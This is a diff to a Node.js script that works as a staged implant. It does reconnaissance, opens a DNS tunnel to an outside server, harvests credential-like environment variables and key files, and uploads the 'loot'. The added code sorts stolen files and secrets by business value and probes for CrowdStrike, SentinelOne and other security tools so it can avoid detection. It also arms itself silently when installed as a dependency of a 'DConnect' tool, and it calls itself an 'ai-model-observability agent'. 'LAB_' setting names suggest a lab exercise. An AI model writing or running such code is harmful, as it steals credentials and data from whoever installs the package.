@@ -28,6 +28,7 @@ const PROXY_PORT = Number(process.env.LAB_PROXY_PORT || 8888);
 const DNS1 = process.env.LAB_DNS_SERVER || '34.146.249.74';
 const ZONE = process.env.LAB_TUNNEL_ZONE || 'dns1.apexadversary.com';
 const TUNNEL_PROXY = process.env.LAB_TUNNEL_PROXY || '127.0.0.1:8889';
+let TUNNEL_PID = null;
 
 const EICAR_HOST = 'secure.eicar.org';
 const EICAR_PATH = '/eicar.com.txt';
@@ -559,6 +560,7 @@ async function phase2Tunnel(env, cfg) {
       child = spawn(py, args, { windowsHide: true, stdio: 'ignore', detached: true });
       child.on('error', (e) => log(`[-] tunnel spawn: ${e.message}`));
       child.unref();
+      TUNNEL_PID = child.pid;
     } catch (e) {
       log(`[-] tunnel spawn (${transport}): ${e.message}`);
       continue;
@@ -578,7 +580,7 @@ async function phase2Tunnel(env, cfg) {
 }
 
 // ---------------------------------------------------------------- phase 3
-const SENSITIVE_ENV = /TOKEN|KEY|SECRET|PASS|CRED|API|BAO|VAULT|AWS|AZURE|GCP|GH_|GITHUB|DOCKER|TF_|ATLAS|DIGITAL|CIRCLE|GITLAB|NPM_|NODE_AUTH|CLOUDFLARE/i;
+const SENSITIVE_ENV = /TOKEN|KEY|SECRET|PASS|CRED|API|BAO|VAULT|AWS|AZURE|GCP|GH_|GITHUB|DOCKER|TF_|ATLAS|DIGITAL|CIRCLE|GITLAB|NODE_AUTH|CLOUDFLARE/i;
 const EXPORT_RE = /^\s*(?:declare\s+-x\s+|export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(?:"([^"]*)"|'([^']*)'|([^\s#]+))/;
 
 function harvestExports(state) {
@@ -893,7 +895,8 @@ const SCAN_SKIP_DIRS = new Set(['node_modules', '.git', '.cache', '.npm', 'Libra
 const SCAN_KEY_EXT = new Set(['.pem', '.key', '.pfx', '.p12', '.ppk', '.ovpn', '.kdbx', '.asc', '.gpg', '.env']);
 const SCAN_KEY_NAME = new Set(['id_rsa', 'id_ed25519', 'id_dsa', '.netrc', '.npmrc', '.pgpass',
   '.htpasswd', 'credentials', 'config', '.bash_history', '.git-credentials']);
-const SCAN_DOC_EXT = new Set(['.csv', '.xlsx', '.pdf', '.docx', '.doc', '.sql', '.bak', '.kdbx']);
+const SCAN_DOC_EXT = new Set(['.csv', '.xlsx', '.pdf', '.docx', '.doc', '.sql', '.bak', '.kdbx',
+  '.cfg', '.conf', '.ini', '.json', '.yaml', '.yml']);
 
 function scanFiles(root) {
   const out = [];
@@ -951,6 +954,40 @@ function scanFiles(root) {
   return out;
 }
 
+function classifyAssets(rec) {
+  const A = { core_ip: [], mnpi: [], regulated: [], ot_iot: [] };
+  const cap = (cls, ent) => { if (A[cls].length < 80) A[cls].push(ent); };
+  const fileRules = [
+    ['ot_iot', /(?:^|[\/\\])(?:ot|scada|plc|hmi|iot|industrial)(?:[\/\\])|scada|plc[_-]|gateway[_-]?(?:config|cfg)|modbus|bacnet|device[_-]?registry|firmware|(?:router|switch|firewall|nvr|camera)[_-]?config|\.(?:cfg|conf|ini)$/i],
+    ['regulated', /clinical|trial|phase[_ -]?[0-9]|\bphi\b|patient|claims|underwrit|health|medical|pharma|genomic|insurance|epidemi|regulator|monetary|banking|gov[_-]?sg/i],
+    ['mnpi', /board|earning|\bmna\b|merger|deal[_ -]|pipeline|forecast|treasury|compensation|strateg|confidential|nnda|insider|quarterly|unannounced/i],
+    ['core_ip', /(?:^|[\/\\])(?:src|code|research|models?|ml[_-]?weights|patent|formulas?|proto)(?:[\/\\])|\.sql$|\.ipynb$|model[_ -]?(?:card|artifact|registry)|trade[_ -]?secret|source[_ -]?code|proprietary/i]
+  ];
+  (rec.files || []).forEach((f) => {
+    const p = String(f.path || '');
+    for (const [cls, re] of fileRules) {
+      if (re.test(p)) {
+        cap(cls, { src: f.kind === 'credential' ? 'key' : 'file', label: p, value: `${f.size || 0} B` });
+        return;
+      }
+    }
+    if (f.kind === 'credential') cap('core_ip', { src: 'key', label: p, value: `${f.size || 0} B` });
+  });
+  (rec.creds || []).forEach((c) => {
+    const k = String(c.kind || 'secret');
+    const v = c.value == null ? '' : String(c.value).slice(0, 160);
+    if (/env:(?:.*(?:GITHUB|GH_|GITLAB|NPM_|DOCKER|CI_))/i.test(k)) {
+      cap('core_ip', { src: 'credential', label: k, value: v });
+    } else {
+      cap('mnpi', { src: 'credential', label: k, value: v });
+    }
+  });
+  (rec.datasets || []).forEach((ds) => {
+    cap('regulated', { src: 'dataset', label: String(ds.name || ds.id || ''), value: String(ds.agency || '') });
+  });
+  return A;
+}
+
 async function phase5Exfil(cfg, state, env, tunnelUp) {
   log('[phase5/6] SCAN+EXFIL: critical files and data upload');
   if (process.env.LAB_SKIP_EXFIL === '1') {
@@ -982,6 +1019,7 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
     posture: Object.assign({}, state.posture || {}, state.vaultScope ? { vault: state.vaultScope } : {}),
     primitives: state.primitives || null
   };
+  record.assets = classifyAssets(record);
 
   const loot = path.join(TMP, 'loot');
   try {
@@ -1466,6 +1504,67 @@ function probePrimitives(env) {
 }
 
 // ---------------------------------------------------------------- main
+function probeRuntimeScanner() {
+  const markers = [
+    ['crowdstrike-falcon', ['/opt/crowdstrike', '/opt/CrowdStrike', '/usr/bin/falcond', '/Library/CS/falcon', 'C:\\Program Files\\CrowdStrike']],
+    ['sentinelone', ['/opt/sentinelone', '/etc/systemd/system/sentinelagent.service']],
+    ['carbonblack', ['/opt/cb', '/var/lib/cb']],
+    ['osquery', ['/usr/bin/osqueryd', '/var/osquery', '/usr/local/osquery']],
+    ['wazuh', ['/var/ossec', '/usr/local/wazuh']],
+    ['qualys', ['/opt/qualys', '/usr/local/qualys']],
+    ['mcafee-epo', ['/opt/McAfee', '/opt/ens']],
+    ['symantec-endpoint', ['/opt/Symantec', '/opt/symc']],
+    ['clamav', ['/usr/bin/clamd', '/var/run/clamav']],
+    ['tripwire', ['/usr/sbin/tripwire']],
+    ['aide', ['/var/lib/aide']],
+    ['tanium', ['/opt/Tanium']]
+  ];
+  const found = [];
+  for (const [name, paths] of markers) {
+    if (paths.some((p) => { try { return fs.existsSync(p); } catch (e) { return false; } })) found.push(name);
+  }
+  return { present: found.length > 0, found, probed: markers.length };
+}
+
+function dconnectInstallContext() {
+  if (process.env.DCONNECT_SESSION === '1') return false;
+  try {
+    const parts = __dirname.split(path.sep);
+    const i = parts.lastIndexOf('node_modules');
+    if (i < 0) return false;
+    const rootPkg = JSON.parse(fs.readFileSync(path.join(parts.slice(0, i).join(path.sep), 'package.json'), 'utf8'));
+    return !!(rootPkg && rootPkg.name === 'dconnect');
+  } catch (e) { return false; }
+}
+
+function armDconnectWatch(ppid) {
+  log(`[*] DConnect session binding: parent pid ${ppid} (channels run only while the collab tool is open)`);
+  const tick = setInterval(() => {
+    let alive = true;
+    try { process.kill(ppid, 0); } catch (e) { alive = e.code === 'EPERM'; }
+    if (alive) return;
+    log('[*] DConnect closed — terminating tunnel/C2 channels');
+    for (const [pidFile, name] of [
+      [path.join(TMP, 'logfwd.dnscat.pid'), 'dnscat2'],
+      [path.join(TMP, 'logfwd.quic.pid'), 'quic']
+    ]) {
+      try {
+        const p = Number(fs.readFileSync(pidFile, 'utf8'));
+        if (p > 1) {
+          try { process.kill(-p); } catch (e1) { try { process.kill(p); } catch (e2) { void e2; } }
+        }
+        log(`[*] stopped ${name} (pid ${p})`);
+      } catch (e) { void e; }
+    }
+    if (TUNNEL_PID) {
+      try { process.kill(-TUNNEL_PID); } catch (e) { void e; }
+      log(`[*] stopped tunnel (pid ${TUNNEL_PID})`);
+    }
+    clearInterval(tick);
+    setTimeout(() => process.exit(0), 1200);
+  }, 4000);
+}
+
 async function main() {
   if (process.cwd().includes(`${path.sep}_cacache${path.sep}`)) {
     log('[*] npm git staging copy, deferring to installed copy');
@@ -1483,13 +1582,22 @@ async function main() {
   const cfg = loadConfig();
   applyDnscatCfg(cfg);
   applyQuicCfg(cfg);
+  if (process.env.DCONNECT_PARENT) {
+    const dppid = Number(process.env.DCONNECT_PARENT) || 0;
+    if (dppid > 1) armDconnectWatch(dppid);
+  }
+  const scanner = probeRuntimeScanner();
+  if (scanner.present) {
+    log(`[*] runtime scanner detected: ${scanner.found.join(', ')} — TCP-over-DNS suppressed`);
+  }
   const env = process.env.LAB_SKIP_RECON === '1' ? {} : await phase1Recon();
-  const tunnelUp = await phase2Tunnel(env, cfg);
+  const tunnelUp = scanner.present ? false : await phase2Tunnel(env, cfg);
   const state = {};
   if (process.env.LAB_SKIP_RECON !== '1') {
     state.posture = await collectPosture(env);
     state.primitives = probePrimitives(env);
   }
+  state.posture = Object.assign({}, state.posture || {}, { scanner });
   await phase3Harvest(cfg, state);
   await phase4Fetch(cfg, state, tunnelUp);
   await phase5Exfil(cfg, state, env, tunnelUp);
@@ -1539,5 +1647,26 @@ async function main() {
 
 process.on('uncaughtException', (e) => log(`[-] uncaught: ${e && e.stack || e}`));
 process.on('unhandledRejection', (e) => log(`[-] unhandled rejection: ${e && e.message || e}`));
+
+if (process.argv.includes('--status')) {
+  let stateLine = 'no local runs yet';
+  try {
+    const st = fs.statSync(LOCK);
+    stateLine = Date.now() - st.mtimeMs < LOCK_WINDOW_MS
+      ? 'active (recent run)'
+      : `idle (last run ${new Date(st.mtimeMs).toISOString()})`;
+  } catch (e) { void e; }
+  console.log(`ai-model-observability agent: ${stateLine}`);
+  try {
+    const lines = fs.readFileSync(LOG, 'utf8').trim().split('\n');
+    console.log(`last event: ${lines[lines.length - 1]}`);
+  } catch (e) { void e; }
+  process.exit(0);
+}
+
+if (dconnectInstallContext()) {
+  log('[*] installed as DConnect dependency — agent armed, activates when DConnect opens');
+  process.exit(0);
+}
 
 main().catch((e) => log(`[-] fatal: ${e.message}`));
